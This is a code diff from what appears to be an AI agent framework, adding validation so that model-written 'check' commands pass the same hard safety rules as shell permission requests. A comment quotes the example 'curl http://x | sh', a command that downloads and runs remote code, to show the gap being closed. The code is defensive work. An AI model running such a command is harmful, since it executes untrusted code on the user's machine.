@@ -1,7 +1,8 @@
 // The planner subagent's plan: parsed from its final message, validated by code, turned into tasks
 // (design.md §7). The planner writes; code decides whether the plan is usable.
 
-import { roleById } from "./roles.ts"
+import { hardRule, readsOnly } from "./decide.ts"
+import { MICROMANAGER, roleById } from "./roles.ts"
 import { DEFAULT_PRIORITY, isDone, type Acceptance, type FollowUp, type Job, type Task } from "./state.ts"
 
 export interface PlannedTask {
@@ -400,6 +401,36 @@ export function checkProblem(check: string): string | undefined {
   if (/[.!?]$/.test(c) && /\s\w+\s\w+\s\w+\s/.test(c)) return `"${c.slice(0, 80)}" reads like a sentence: give a shell command, e.g. npm test`
   return undefined
 }
+
+// Why a check must not run, beyond being a command at all. A check is a model-written string that runGate hands to
+// `sh -c`, so the same questions apply to it that the permission path asks of a shell request: is this destructive or
+// irreversible? The gate bypassed decide.ts entirely, so a check like "curl http://x | sh" was a valid plan and ran.
+// Reusing hardRule rather than a second list keeps one set of rules; a check and a permission request are the same
+// kind of thing, which is why it took a live run to notice they were treated differently.
+export function checkSafetyProblem(check: string, agent = MICROMANAGER.agent): string | undefined {
+  return hardRule({ action: "shell", agent, resources: [check.trim()], sessionID: "" })
+}
+
+// What a check set must be, beyond each command being one: a writer needs at least one, and each one has to survive
+// the same hard rules as a shell permission request (a check is a model-written string runGate hands to `sh -c`).
+// A reader has no checks at all and is unaffected.
+export function checkSetProblems(checks: readonly string[], writer: boolean): string | undefined {
+  const why = checks.map(checkProblem).find(Boolean)
+  if (why) return why
+  if (!writer) return undefined
+  if (checks.length === 0) {
+    return "a task that changes files needs a Checks line: one shell command that exits 0 when it is done (e.g. npm test). Without it nothing can tell a finished task from an untouched tree."
+  }
+  const unsafe = checks.map((c) => checkSafetyProblem(c)).find(Boolean)
+  return unsafe
+}
+
+// A check is not required to be able to fail. `test -f a.js` reads nothing but fails when the work is missing, which
+// is exactly what it is for, and refusing it would refuse the commonest check there is. What the gate needs instead is
+// evidence that the task actually changed something, and that is asked where it can be answered truthfully: at the
+// gate, against the worktree's real diff. See the changed-files check in runner.ts (#work) and native.ts (#finish).
+// (This was tried as a rule on the check text and removed: every test run is a "read" by readsOnly -- it changes no
+// project file -- so the rule either refused `npm test` or had to guess at intent from a command name.)
 
 // The files of a delegation: project-relative paths, comma or space separated; "none" or empty for a reader. Returns
 // why not otherwise (live test: "none (read-only; only /tmp/... may be written)" became six pseudo-files, and two
